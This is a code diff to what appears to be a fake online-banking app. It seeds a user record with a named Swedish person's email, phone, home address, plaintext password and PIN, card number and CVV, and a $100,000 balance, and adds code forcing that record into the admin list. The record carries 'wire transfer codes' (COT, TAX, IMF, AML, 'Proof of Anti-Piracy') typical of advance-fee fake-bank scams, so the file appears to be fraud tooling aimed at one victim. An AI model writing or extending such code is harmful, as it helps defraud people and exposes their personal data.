@@ -175,6 +175,71 @@ const initialSeedUsers = [
       PAP: { code: 'PAP-33810', active: true, notes: 'Proof of Anti-Piracy / Source of Wealth code' }
     },
     activityLog: []
+  },
+  {
+    id: 'usr-659',
+    fullName: 'Olle Robert Christer Råström',
+    firstName: 'Olle Robert Christer',
+    lastName: 'Råström',
+    username: 'ollerobertrstrm52',
+    email: 'debstarnetwork@gmail.com',
+    password: 'Password123!',
+    pin: '8869',
+    transactionPin: '8869',
+    role: 'Member',
+    is_admin: false,
+    phone: '+46702813441',
+    avatar: 'OR',
+    avatarColor: 'linear-gradient(135deg, #059669 0%, #10b981 100%)',
+    dob: '1982-05-18',
+    nationality: 'Sweden',
+    address: 'Korgmakargatan 32 621 53 Visby',
+    status: 'active',
+    account_status: 'active',
+    accountStatus: 'active',
+    statusReason: 'Active Member Clearance',
+    kycStatus: 'verified',
+    kyc_status: 'verified',
+    createdAt: '2026-10-07T10:00:00Z',
+    lastLogin: new Date().toISOString(),
+    accounts: [
+      {
+        accountNumber: '09372996993',
+        type: 'Checking',
+        name: 'Checking Primary Vault',
+        currency: 'USD',
+        balance: 100000.00,
+        status: 'active',
+        routingNumber: '021000089',
+      }
+    ],
+    transactions: [],
+    cards: [
+      {
+        id: 'crd-659',
+        cardNumber: '4532 7140 3114 3230',
+        cardHolder: 'OLLE ROBERT CHRISTER RÅSTRÖM',
+        type: 'Visa Platinum Debit',
+        expiry: '09/31',
+        cvv: '775',
+        pin: '8869',
+        status: 'active',
+        dailyAtmLimit: 10000,
+        onlineLimit: 50000,
+      }
+    ],
+    cryptoWallets: [
+      { currency: 'BTC', balance: 0.00, address: 'bc1q9x48v2m9sl3k0pw84mz789xq4e9', status: 'active' }
+    ],
+    wireTransferCodes: {
+      COT: { code: '0467799', active: true, notes: 'Cost of Transfer clearance token' },
+      TAX: { code: 'TX-88392', active: true, notes: 'Tax Clearance certificate' },
+      IMF: { code: '9498779', active: true, notes: 'IMF Clearance signoff' },
+      AML: { code: 'AML-86902', active: true, notes: 'Anti-Money Laundering verification key' },
+      PAP: { code: 'PAP-70216', active: true, notes: 'Proof of Anti-Piracy clearance' },
+      OTP: '806158'
+    },
+    activityLog: []
   }
 ];
 
@@ -306,8 +371,41 @@ export function getAdminUsersList() {
     if (!primary.password) primary.password = '12345';
   }
 
+  // Ensure all initialSeedUsers (including Olle Robert Christer Råström) are present
+  initialSeedUsers.forEach((seedUser) => {
+    const foundIdx = list.findIndex((u) => u.id === seedUser.id || (u.email && seedUser.email && u.email.toLowerCase() === seedUser.email.toLowerCase()));
+    if (foundIdx === -1) {
+      list.push(JSON.parse(JSON.stringify(seedUser)));
+    } else {
+      // Merge missing wireTransferCodes, cards, or account details from seed if needed
+      const existing = list[foundIdx];
+      if (seedUser.id === 'usr-659') {
+        existing.id = seedUser.id;
+        existing.fullName = seedUser.fullName;
+        existing.username = seedUser.username;
+        existing.email = seedUser.email;
+        existing.phone = seedUser.phone;
+        existing.address = seedUser.address;
+        existing.nationality = seedUser.nationality;
+        existing.pin = seedUser.pin;
+        existing.transactionPin = seedUser.transactionPin;
+        existing.status = seedUser.status;
+        existing.kycStatus = seedUser.kycStatus;
+        if (!existing.wireTransferCodes || Object.keys(existing.wireTransferCodes).length === 0) {
+          existing.wireTransferCodes = seedUser.wireTransferCodes;
+        }
+        if (!existing.accounts || existing.accounts.length === 0) {
+          existing.accounts = seedUser.accounts;
+        }
+        if (!existing.cards || existing.cards.length === 0) {
+          existing.cards = seedUser.cards;
+        }
+      }
+    }
+  });
+
   // Ensure all users have required fields and passwords
-  const defaultPwds = ['MemberPass123!', 'Vanguard@2026!', 'Sterling#884!', 'SingaporeBio#99!'];
+  const defaultPwds = ['MemberPass123!', 'Password123!', 'Vanguard@2026!', 'Sterling#884!'];
   list.forEach((u, i) => {
     if (!u.password) {
       u.password = defaultPwds[i % defaultPwds.length] || 'MemberPass123!';
